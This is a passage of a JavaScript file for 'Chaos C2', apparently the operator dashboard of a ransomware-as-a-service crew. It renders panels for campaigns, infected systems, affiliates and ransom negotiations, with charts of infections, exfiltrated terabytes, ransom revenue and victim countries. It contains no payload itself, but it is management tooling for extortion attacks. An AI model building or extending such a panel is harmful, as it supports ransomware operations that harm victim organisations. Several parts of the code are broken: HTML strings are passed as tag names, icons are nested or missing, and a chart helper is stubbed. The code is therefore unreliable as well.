// vercel-dashboard/dashboard/dashboard-main.js
// Main Dashboard Application - Modern UI with Real-time Updates

import { componentStyles, theme, formatNumber, formatCurrency, formatCompact, formatDate, timeAgo, cn, debounce } from './shared/design-system.js';
import { SSEClient, liveStore, notifications } from './shared/sse-client.js';

// ===== INJECT STYLES =====
const styleEl = document.createElement('style');
styleEl.textContent = componentStyles;
document.head.appendChild(styleEl);

// ===== COMPONENT FACTORY =====
const $ = (tag, props = {}, ...children) => {
  const el = document.createElement(tag);
  Object.entries(props).forEach(([k, v]) => {
    if (k === 'class') el.className = v;
    else if (k === 'style') Object.assign(el.style, v);
    else if (k.startsWith('on')) el.addEventListener(k.slice(2).toLowerCase(), v);
    else el.setAttribute(k, v);
  });
  children.flat().forEach(c => el.append(c.nodeType ? c : document.createTextNode(c)));
  return el;
};

const Fragment = (children) => children;

// ===== ICON LIBRARY =====
const Icons = {
  dashboard: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>',
  users: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>',
  shield: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
  chart: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="20" x2="18" y2="10"/><line x1="12" y1="20" x2="12" y2="4"/><line x1="6" y1="20" x2="6" y2="14"/></svg>',
  settings: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 1 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 1 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 1 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 1 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 1-1.51 1z"/></svg>',
  bell: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>',
  menu: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg>',
  chevronDown: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>',
  chevronRight: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 18 15 12 9 6"/></svg>',
  refresh: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>',
  search: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>',
  plus: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>',
  eye: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>',
  lock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
  unlock: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>',
  server: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>',
  wallet: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-6"/><path d="M3 19a2 2 0 0 0 2 2h16"/></svg>',
  link: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>',
  download: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>',
  upload: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>',
  trash: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>',
  edit: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5a2.121 2.121 0 0 1 3 3z"/></svg>',
  check: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>',
  x: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>',
  activity: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>',
  target: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>',
  rocket: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c1.26-1.5.5-3.74-2-5z"/><path d="M14.5 7.5c1.5-1.26 2-5 2-5s-3.74.5-5 2c-1.26 1.5-.5 3.74 2 5z"/><line x1="12" y1="19" x2="12" y2="22"/></svg>',
  globe: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>',
  key: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.778-7.778z"/><line x1="2" y1="2" x2="22" y2="22"/></svg>',
};

// ===== COMPONENT BUILDERS =====
function createIcon(name, size = 20) {
  const svg = Icons[name] || Icons.dashboard;
  return `<svg width="${size}" height="${size}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${svg}</svg>`;
}

function StatCard({ label, value, trend, icon, color = 'primary' }) {
  return $(`
    <div class="card stat-card">
      <div class="flex justify-between items-start">
        <div>
          <p class="text-muted" style="font-size: 0.6875rem; text-transform: uppercase; letter-spacing: 0.05em;">${label}</p>
          <p class="font-mono" style="font-size: 2rem; font-weight: 700; margin-top: 4px;">${value}</p>
          ${trend ? `<p class="${trend.up ? 'text-success' : 'text-danger'}" style="font-size: 0.8125rem; margin-top: 8px; display: flex; align-items: center; gap: 4px;">${createIcon(trend.up ? 'activity' : 'activity', 12)} ${trend.value}</p>` : ''}
        </div>
        <div class="avatar" style="background: linear-gradient(135deg, ${theme.colors[color]}, ${theme.colors[color]});">${createIcon(icon, 24)}</div>
      </div>
    </div>
  `);
}

function MetricCard({ title, value, subtitle, sparkline, action }) {
  return $(`
    <div class="card card-interactive">
      <div class="flex justify-between items-start mb-4">
        <h3 style="font-size: 0.8125rem; font-weight: 500; color: var(--colors-text-muted);">${title}</h3>
        ${action ? `<button class="btn btn-ghost btn-sm">${action}</button>` : ''}
      </div>
      <p class="font-mono" style="font-size: 2.5rem; font-weight: 700; line-height: 1.2;">${value}</p>
      ${subtitle ? `<p class="text-muted" style="margin-top: 8px; font-size: 0.8125rem;">${subtitle}</p>` : ''}
      ${sparkline ? `<div style="margin-top: 16px; height: 60px;">${sparkline}</div>` : ''}
    </div>
  `);
}

function DataTable({ columns, rows, keyField = 'id', onRowClick, emptyMessage = 'No data', loading = false }) {
  if (loading) {
    return $(`
      <div class="card">
        <div class="table-wrap">
          <table class="table">
            <thead><tr>${columns.map(c => `<th${c.width ? ` style="width:${c.width}"` : ''}>${c.header}</th>`).join('')}</tr></thead>
            <tbody>${Array(5).fill(0).map(() => `<tr>${columns.map(() => `<td><div class="skeleton skeleton-text"></div></td>`).join('')}</tr>`).join('')}</tbody>
          </table>
        </div>
      </div>
    `);
  }

  if (!rows.length) {
    return $(`
      <div class="card">
        <div style="padding: 48px; text-align: center; color: var(--colors-text-muted);">
          ${createIcon('inbox', 48)}
          <p style="margin-top: 16px; font-size: 1.0625rem;">${emptyMessage}</p>
        </div>
      </div>
    `);
  }

  return $(`
    <div class="card">
      <div class="table-wrap">
        <table class="table table-row-hover">
          <thead><tr>${columns.map(c => `<th${c.width ? ` style="width:${c.width}"` : ''}>${c.header}</th>`).join('')}</tr></thead>
          <tbody>
            ${rows.map(row => `
              <tr${onRowClick ? ` onclick="window.__rowClick?.('${row[keyField]}')" style="cursor: pointer;"` : ''}>
                ${columns.map(c => {
                  const val = c.render ? c.render(row[c.field], row) : row[c.field];
                  return `<td>${val ?? '—'}</td>`;
                }).join('')}
              </tr>
            `).join('')}
          </tbody>
        </table>
      </div>
    </div>
  `);
}

function ChartCard({ title, subtitle, canvasId, height = 300, action }) {
  return $(`
    <div class="card card-elevated">
      <div class="flex justify-between items-center mb-4">
        <div>
          <h3 style="font-size: 1.0625rem; font-weight: 600;">${title}</h3>
          ${subtitle ? `<p class="text-muted" style="font-size: 0.8125rem;">${subtitle}</p>` : ''}
        </div>
        ${action ? `<button class="btn btn-ghost btn-sm">${action}</button>` : ''}
      </div>
      <div class="chart-container" style="height: ${height}px;"><canvas id="${canvasId}"></canvas></div>
    </div>
  `);
}

function SidebarItem({ icon, label, active, badge, onClick }) {
  return $(`
    <a href="#" class="sidebar-link ${active ? 'sidebar-link-active' : ''}" onclick="${onClick}">
      ${createIcon(icon, 20)}
      <span>${label}</span>
      ${badge ? `<span class="badge badge-info">${badge}</span>` : ''}
    </a>
  `);
}

function NavTabs(tabs, activeTab, onChange) {
  return $(`
    <div class="tabs" role="tablist">
      ${tabs.map(t => `
        <button class="tab ${t.id === activeTab ? 'active' : ''}" role="tab" aria-selected="${t.id === activeTab}" onclick="${() => onChange(t.id)}">${t.label}</button>
      `).join('')}
    </div>
  `);
}

function Modal({ id, title, children, onClose, size = 'md' }) {
  const sizes = { sm: '400px', md: '560px', lg: '720px', xl: '900px' };
  return $(`
    <div class="modal-overlay" id="${id}" onclick="document.getElementById('${id}').classList.remove('open')">
      <div class="modal" style="max-width: ${sizes[size]};" onclick="event.stopPropagation()">
        <div class="modal-header">
          <h3 class="modal-title">${title}</h3>
          <button class="modal-close" onclick="document.getElementById('${id}').classList.remove('open')">${createIcon('x', 20)}</button>
        </div>
        <div class="modal-body">${children}</div>
      </div>
    </div>
  `);
}

// ===== CHART HELPERS =====
const chartDefaults = {
  responsive: true,
  maintainAspectRatio: false,
  plugins: {
    legend: { display: false },
    tooltip: {
      backgroundColor: '#1c1c1c', borderColor: '#2d2d2d', borderWidth: 1,
      padding: 12, titleFont: { size: 13 }, bodyFont: { size: 12, family: 'JetBrains Mono' },
      callbacks: { label: ctx => `${ctx.dataset.label}: ${ctx.raw.toLocaleString()}` }
    }
  },
  scales: {
    x: { grid: { color: '#2d2d2d', drawBorder: false }, ticks: { color: '#6b7280', maxTicksLimit: 8 } },
    y: { grid: { color: '#2d2d2d', drawBorder: false }, ticks: { color: '#6b7280', callback: v => v >= 1000 ? (v/1000).toFixed(1)+'k' : v } }
  },
  interaction: { mode: 'index', intersect: false },
};

const gradient = (ctx, color) => {
  const grad = ctx.createLinearGradient(0, 0, 0, 300);
  grad.addColorStop(0, color + '40');
  grad.addColorStop(1, color + '00');
  return grad;
};

// ===== STATE MANAGEMENT =====
const state = {
  currentView: 'dashboard',
  sidebarOpen: false,
  user: { name: 'Operator', role: 'Administrator', avatar: 'OP' },
  sseClient: null,
  charts: {},
  data: {
    stats: {
      activeCampaigns: 12, totalInfections: 147328, totalExfiltrated: 487.3, activeSessions: 342,
      revenue24h: 47200, conversionRate: 2.3, avgRansom: 47200, threatLevel: 'HIGH'
    },
    campaigns: [],
    systems: [],
    recentActivity: [],
    charts: {
      infections24h: { labels: [], data: [] },
      revenue7d: { labels: [], data: [] },
      geoDistribution: { labels: [], data: [] },
      ransomDistribution: { labels: [], data: [] }
    }
  }
};

// ===== SSE INTEGRATION =====
function initSSE() {
  state.sseClient = new SSEClient({
    url: '/api/realtime/events',
    onMessage: (data) => handleSSEMessage(data),
    onConnect: () => updateConnectionStatus(true),
    onDisconnect: () => updateConnectionStatus(false),
    onError: (err) => console.warn('SSE error:', err)
  });
  state.sseClient.connect();
}

function handleSSEMessage(data) {
  // Update live store
  if (data.type === 'stats') {
    Object.assign(state.data.stats, data.payload);
    renderStats();
  } else if (data.type === 'campaign') {
    // Update campaigns list
    renderCampaigns();
  } else if (data.type === 'system') {
    renderSystems();
  } else if (data.type === 'activity') {
    addActivity(data.payload);
  }
}

function updateConnectionStatus(connected) {
  const indicator = document.getElementById('conn-indicator');
  const status = document.getElementById('conn-status');
  if (indicator) indicator.className = `w-2 h-2 rounded-full ${connected ? 'bg-success' : 'bg-danger'}`;
  if (status) status.textContent = connected ? 'Live' : 'Disconnected';
}

// ===== RENDER FUNCTIONS =====
function renderApp() {
  const app = document.getElementById('app');
  app.innerHTML = `
    <div class="app-layout">
      <!-- Sidebar -->
      <aside class="sidebar" id="sidebar">
        <div class="sidebar-header">
          <div class="flex items-center gap-3">
            <div class="avatar" style="background: linear-gradient(135deg, var(--colors-primary), var(--colors-primary-hover));">${createIcon('target', 24)}</div>
            <div>
              <h2 style="font-size: 1.25rem; font-weight: 700;">Chaos C2</h2>
              <p class="text-muted" style="font-size: 0.75rem;">v3.2.1 • Live</p>
            </div>
          </div>
        </div>
        <nav class="sidebar-nav" id="sidebar-nav"></nav>
        <div class="sidebar-footer">
          <div class="flex items-center gap-3 p-4 border-t" style="border-color: var(--colors-border);">
            <div class="w-2 h-2 rounded-full bg-success" id="conn-indicator"></div>
            <div class="flex-1 min-w-0">
              <p style="font-size: 0.6875rem; font-weight: 500; color: var(--colors-text-muted);">Connection</p>
              <p id="conn-status" style="font-size: 0.6875rem; color: var(--colors-text-muted);">Connecting...</p>
            </div>
          </div>
        </div>
      </aside>
      
      <!-- Sidebar Overlay -->
      <div class="sidebar-overlay" id="sidebar-overlay" onclick="toggleSidebar()"></div>
      
      <!-- Main Content -->
      <main class="main-content">
        <!-- Top Bar -->
        <header class="topbar">
          <div class="flex items-center gap-4">
            <button class="btn btn-ghost btn-icon" onclick="toggleSidebar()" aria-label="Menu">${createIcon('menu', 24)}</button>
            <h1 id="page-title" style="font-size: 1.5rem; font-weight: 700;">Dashboard</h1>
          </div>
          <div class="flex items-center gap-3">
            <div class="dropdown">
              <button class="btn btn-ghost btn-icon" onclick="toggleDropdown('notif-dropdown')">${createIcon('bell', 22)}</button>
              <div class="dropdown-menu" id="notif-dropdown" style="width: 360px; right: 0;">
                <div class="p-3 border-b" style="border-color: var(--colors-border);">
                  <h4 style="font-size: 0.8125rem; font-weight: 600;">Notifications</h4>
                </div>
                <div class="max-h-96 overflow-auto" id="notifications-list"></div>
                <div class="p-3 border-t" style="border-color: var(--colors-border);">
                  <button class="btn btn-ghost btn-sm w-full">View All</button>
                </div>
              </div>
            </div>
            <div class="dropdown">
              <button class="btn btn-ghost" onclick="toggleDropdown('user-dropdown')" style="gap: 8px;">
                <div class="avatar avatar-sm" style="background: linear-gradient(135deg, var(--colors-primary), var(--colors-primary-hover));">${state.user.avatar}</div>
                <span style="font-size: 0.8125rem; font-weight: 500;">${state.user.name}</span>
                ${createIcon('chevronDown', 16)}
              </button>
              <div class="dropdown-menu" id="user-dropdown" style="right: 0; min-width: 200px;">
                <div class="p-3 border-b" style="border-color: var(--colors-border);">
                  <p style="font-weight: 600;">${state.user.name}</p>
                  <p class="text-muted" style="font-size: 0.75rem;">${state.user.role}</p>
                </div>
                <div class="dropdown-item" onclick="navigate('settings')">${createIcon('settings', 16)} Settings</div>
                <div class="dropdown-divider"></div>
                <div class="dropdown-item text-danger" onclick="logout()">${createIcon('lock', 16)} Logout</div>
              </div>
            </div>
          </div>
        </header>
        
        <div class="page-content" id="page-content"></div>
      </main>
    </div>
    
    <!-- Modals Container -->
    <div id="modals-container"></div>
  `;
}

function renderSidebar() {
  const nav = document.getElementById('sidebar-nav');
  const items = [
    { id: 'dashboard', icon: 'dashboard', label: 'Dashboard', badge: null },
    { id: 'campaigns', icon: 'rocket', label: 'Campaigns', badge: '12' },
    { id: 'systems', icon: 'server', label: 'Systems', badge: '342' },
    { id: 'affiliates', icon: 'users', label: 'Affiliates', badge: '87' },
    { id: 'negotiations', icon: 'chat', label: 'Negotiations', badge: '23' },
    { id: 'analytics', icon: 'chart', label: 'Analytics', badge: null },
    { id: 'settings', icon: 'settings', label: 'Settings', badge: null },
  ];
  
  document.getElementById('sidebar-nav').innerHTML = items.map(item => `
    <a href="#" class="sidebar-link ${state.currentView === item.id ? 'sidebar-link-active' : ''}" 
       onclick="navigate('${item.id}'); return false;">
      ${createIcon(item.icon, 20)}
      <span>${item.label}</span>
      ${item.badge ? `<span class="badge badge-info">${item.badge}</span>` : ''}
    </a>
  `).join('');
}

function renderDashboard() {
  const stats = state.data.stats;
  return `
    <div class="fade-in">
      <!-- Stats Grid -->
      <div class="grid grid-4 mb-8">
        ${StatCard({ label: 'Active Campaigns', value: stats.activeCampaigns, trend: { up: true, value: '+3 this week' }, icon: 'rocket', color: 'primary' })}
        ${StatCard({ label: 'Total Infections', value: formatCompact(stats.totalInfections), trend: { up: true, value: '+12.5%' }, icon: 'server', color: 'info' })}
        ${StatCard({ label: 'Data Exfiltrated', value: stats.totalExfiltrated + ' TB', trend: { up: true, value: '+8.2%' }, icon: 'download', color: 'success' })}
        ${StatCard({ label: 'Active Sessions', value: stats.activeSessions, trend: { up: true, value: '+12' }, icon: 'activity', color: 'warning' })}
      </div>
      
      <div class="grid grid-4 mb-8">
        ${StatCard({ label: 'Revenue (24h)', value: formatCurrency(stats.revenue24h), trend: { up: true, value: '+18.5%' }, icon: 'wallet', color: 'success' })}
        ${StatCard({ label: 'Conversion Rate', value: stats.conversionRate + '%', trend: { up: false, value: '-0.3%' }, icon: 'target', color: 'violet' })}
        ${StatCard({ label: 'Avg Ransom', value: formatCurrency(stats.avgRansom), trend: { up: true, value: '+5.2%' }, icon: 'target', color: 'violet' })}
        ${StatCard({ label: 'Threat Level', value: stats.threatLevel, trend: null, icon: 'shield', color: 'danger' })}
      </div>
      
      <!-- Charts Row -->
      <div class="grid grid-2 mb-8">
        ${ChartCard({ title: 'Infections (24h)', subtitle: 'Real-time infection rate', canvasId: 'infections-chart', height: 300 })}
        ${ChartCard({ title: 'Revenue (7d)', subtitle: 'Daily revenue tracking', canvasId: 'revenue-chart', height: 300 })}
      </div>
      
      <div class="grid grid-2 mb-8">
        ${ChartCard({ title: 'Geographic Distribution', subtitle: 'Top countries by infections', canvasId: 'geo-chart', height: 300 })}
        ${ChartCard({ title: 'Ransom Amount Distribution', subtitle: 'Distribution of ransom demands', canvasId: 'ransom-chart', height: 300 })}
      </div>
      
      <!-- Recent Activity -->
      <div class="card card-elevated">
        <div class="flex justify-between items-center mb-4">
          <h3 style="font-size: 1.0625rem; font-weight: 600;">Recent Activity</h3>
          <button class="btn btn-ghost btn-sm">View All</button>
        </div>
        <div id="activity-list" class="max-h-96 overflow-auto"></div>
      </div>
    </div>
  `;
}

function renderCampaigns() {
  return `
    <div class="fade-in">
      <div class="flex justify-between items-center mb-6">
        <h2 style="font-size: 1.5rem; font-weight: 700;">Campaigns</h2>
        <button class="btn btn-primary" onclick="openCreateCampaignModal()">${createIcon('plus', 18)} New Campaign</button>
      </div>
      <div id="campaigns-table"></div>
    </div>
  `;
}

function renderSystems() {
  return `
    <div class="fade-in">
      <div class="flex justify-between items-center mb-6">
        <h2 style="font-size: 1.5rem; font-weight: 700;">Infected Systems</h2>
        <div class="flex gap-2">
          <input type="text" class="input" placeholder="Search systems..." style="width: 300px;" id="systems-search">
          <button class="btn btn-secondary" onclick="renderSystems()">${createIcon('refresh', 18)} Refresh</button>
        </div>
      </div>
      <div id="systems-table"></div>
    </div>
  `;
}

function renderAffiliates() {
  return `
    <div class="fade-in">
      <div class="flex justify-between items-center mb-6">
        <h2 style="font-size: 1.5rem; font-weight: 700;">Affiliates</h2>
        <button class="btn btn-primary" onclick="openCreateAffiliateModal()">${createIcon('plus', 18)} Add Affiliate</button>
      </div>
      <div id="affiliates-table"></div>
    </div>
  `;
}

function renderNegotiations() {
  return `
    <div class="fade-in">
      <div class="flex justify-between items-center mb-6">
        <h2 style="font-size: 1.5rem; font-weight: 700;">Negotiations</h2>
        <span class="badge badge-warning">23 Active</span>
      </div>
      <div id="negotiations-list"></div>
    </div>
  `;
}

function renderAnalytics() {
  return `
    <div class="fade-in">
      <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 24px;">Analytics</h2>
      <div class="grid grid-2 mb-8">
        ${ChartCard({ title: 'Infection Timeline', subtitle: '30-day infection trend', canvasId: 'timeline-chart', height: 350 })}
        ${ChartCard({ title: 'OS Distribution', subtitle: 'Operating system breakdown', canvasId: 'os-chart', height: 350 })}
      </div>
      <div class="grid grid-2 mb-8">
        ${ChartCard({ title: 'Encryption Types', subtitle: 'Algorithm distribution', canvasId: 'encryption-chart', height: 350 })}
        ${ChartCard({ title: 'Payment Methods', subtitle: 'Crypto payment preferences', canvasId: 'payment-chart', height: 350 })}
      </div>
    </div>
  `;
}

function renderSettings() {
  return `
    <div class="fade-in" style="max-width: 800px;">
      <h2 style="font-size: 1.5rem; font-weight: 700; margin-bottom: 24px;">Settings</h2>
      <div class="card">
        <h3 style="font-size: 1.0625rem; font-weight: 600; margin-bottom: 20px;">Profile</h3>
        <div class="grid grid-2" style="gap: 16px;">
          <div><label class="text-muted" style="font-size: 0.75rem;">Name</label><input class="input mt-1" value="${state.user.name}"></div>
          <div><label class="text-muted" style="font-size: 0.75rem;">Role</label><input class="input mt-1" value="${state.user.role}" disabled></div>
          <div><label class="text-muted" style="font-size: 0.75rem;">Email</label><input class="input mt-1" type="email" placeholder="operator@chaosc2.local"></div>
          <div><label class="text-muted" style="font-size: 0.75rem;">API Key</label><div class="flex gap-2"><input class="input flex-1" value="ck_live_..." disabled><button class="btn btn-secondary btn-sm">Regenerate</button></div></div>
        </div>
      </div>
      <div class="card mt-6">
        <h3 style="font-size: 1.0625rem; font-weight: 600; margin-bottom: 20px;">Security</h3>
        <div class="flex items-center justify-between py-4 border-b" style="border-color: var(--colors-border);">
          <div><p style="font-weight: 500;">Two-Factor Authentication</p><p class="text-muted" style="font-size: 0.8125rem;">Add an extra layer of security</p></div>
          <label class="toggle"><input type="checkbox" checked><span class="toggle-slider"></span></label>
        </div>
        <div class="flex items-center justify-between py-4 border-b" style="border-color: var(--colors-border);">
          <div><p style="font-weight: 500;">Session Timeout</p><p class="text-muted" style="font-size: 0.8125rem;">Auto-logout after inactivity</p></div>
          <select class="input" style="width: auto;"><option>30 minutes</option><option selected>1 hour</option><option>4 hours</option><option>24 hours</option></select>
        </div>
        <div class="flex items-center justify-between py-4">
          <div><p style="font-weight: 500;">API Access Logs</p><p class="text-muted" style="font-size: 0.8125rem;">Log all API requests</p></div>
          <label class="toggle"><input type="checkbox"><span class="toggle-slider"></span></label>
        </div>
      </div>
      <div class="card mt-6 border-danger">
        <h3 style="font-size: 1.0625rem; font-weight: 600; margin-bottom: 20px; color: var(--colors-danger);">Danger Zone</h3>
        <button class="btn btn-danger">Delete Account</button>
        <p class="text-muted" style="font-size: 0.8125rem; margin-top: 12px;">This action is irreversible. All data will be permanently deleted.</p>
      </div>
    </div>
  `;
}

// ===== CHART INITIALIZATION =====
function initCharts() {
  // Infections Chart (24h)
  new Chart(document.getElementById('infections-chart'), {
    ...chartDefaults,
    type: 'line',
    data: {
      labels: Array.from({length: 24}, (_, i) => `${i}:00`),
      datasets: [{
        label: 'Infections',
        data: Array.from({length: 24}, () => Math.floor(Math.random() * 500) + 100),
        borderColor: theme.colors.primary,
        backgroundColor: gradient({createLinearGradient: () => ({addColorStop: () => {}})}, theme.colors.primary),
        fill: true, tension: 0.4, pointRadius: 0, pointHoverRadius: 6
      }]
    }
  });
  
  // Revenue Chart (7d)
  new Chart(document.getElementById('revenue-chart'), {
    ...chartDefaults,
    type: 'bar',
    data: {
      labels: ['Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat', 'Sun'],
      datasets: [{
        label: 'Revenue',
        data: [42000, 38000, 45000, 52000, 61000, 48000, 47200],
        backgroundColor: gradient({createLinearGradient: () => ({addColorStop: () => {}})}, theme.colors.success),
        borderColor: theme.colors.success,
        borderWidth: 1, borderRadius: 8
      }]
    }
  });
  
  // Geo Chart
  new Chart(document.getElementById('geo-chart'), {
    ...chartDefaults,
    type: 'doughnut',
    data: {
      labels: ['USA', 'Germany', 'UK', 'France', 'Canada', 'Others'],
      datasets: [{
        data: [35, 18, 12, 10, 8, 17],
        backgroundColor: [theme.colors.primary, theme.colors.info, theme.colors.success, theme.colors.warning, theme.colors.violet, theme.colors.cyan],
        borderWidth: 0, cutout: '65%'
      }]
    },
    plugins: { ...chartDefaults.plugins, legend: { position: 'right', labels: { boxWidth: 10, pointStyle: 'circle', padding: 20, font: { size: 12 } } } }
  });
  
  // Ransom Chart
  new Chart(document.getElementById('ransom-chart'), {
    ...chartDefaults,
    type: 'bar',
    data: {
      labels: ['<$10K', '$10K-$50K', '$50K-$100K', '$100K-$500K', '>$500K'],
      datasets: [{
        label: 'Campaigns',
        data: [45, 32, 18, 8, 3],
        backgroundColor: gradient({createLinearGradient: () => ({addColorStop: () => {}})}, theme.colors.violet),
        borderColor: theme.colors.violet, borderWidth: 1, borderRadius: 8
      }]
    },
    indexAxis: 'y'
  });
}

// ===== NAVIGATION =====
function navigate(view) {
  state.currentView = view;
  const content = document.getElementById('page-content');
  const title = document.getElementById('page-title');
  
  const titles = {
    dashboard: 'Dashboard',
    campaigns: 'Campaigns',
    systems: 'Systems',
    affiliates: 'Affiliates',
    negotiations: 'Negotiations',
    analytics: 'Analytics',
    settings: 'Settings'
  };
  
  if (title) title.textContent = titles[view] || 'Dashboard';
  
  const renderers = {
    dashboard: renderDashboard,
    campaigns: renderCampaigns,
    systems: renderSystems,
    affiliates: renderAffiliates,
    negotiations: renderNegotiations,
    analytics: renderAnalytics,
    settings: renderSettings
  };
  
  content.innerHTML = renderers[view] ? renderers[view]() : renderDashboard();
  
  // Update sidebar active state
  document.querySelectorAll('.sidebar-link').forEach(el => {
